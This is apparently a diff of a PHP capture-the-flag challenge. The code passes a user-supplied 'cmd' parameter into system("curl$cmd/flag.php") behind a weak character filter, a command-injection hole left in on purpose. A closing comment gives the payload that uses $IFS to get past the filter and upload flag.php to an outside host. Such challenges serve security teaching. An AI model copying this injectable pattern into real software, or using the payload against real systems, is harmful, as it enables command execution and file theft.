@@ -18,32 +18,36 @@ $str = str_replace('!','',$str);
 $str = str_replace('?','',$str);
 $str = str_replace('@','',$str);
 $str = str_replace('+','',$str);
+
+$str = str_replace(':','',$str);  //添加这一句  
 return $str;
 }
 
+
 if($_GET['num']<>""){
 
-$num = $_GET['num'];
-if(strstr($num,'1')){
-die("Sorry");
-}elseif($num <> 1){
+    $num = $_GET['num'];
+    if(strstr($num,'1')){
+        die("Sorry");
+    }elseif($num <> 1){
 
-echo "Try to num = 1";
-
+    echo "Try to num = 1";
 }
 
+
 if($num == 1 ){
+    echo "Flag in http://127.0.0.1/flag.php"."</br>";
+    $cmd=trim($_GET['cmd']);
 
-echo "Flag in http://127.0.0.1/flag.php"."</br>";
-$cmd=trim($_GET['cmd']);
+    $cmd=strreplace($cmd);
 
-$cmd=strreplace($cmd);
+    var_dump("curl$cmd/flag.php");
 
-var_dump("curl$cmd/flag.php");
-
-system("curl$cmd/flag.php");
+    system("curl$cmd/flag.php");
     }
 
 }else{echo "It Works!";}
+
+//$cmd=$IFS\-x$IFS\wonderkun.cc$IFS\-T$IFS\flag.php$IFS\http
 
 ?>
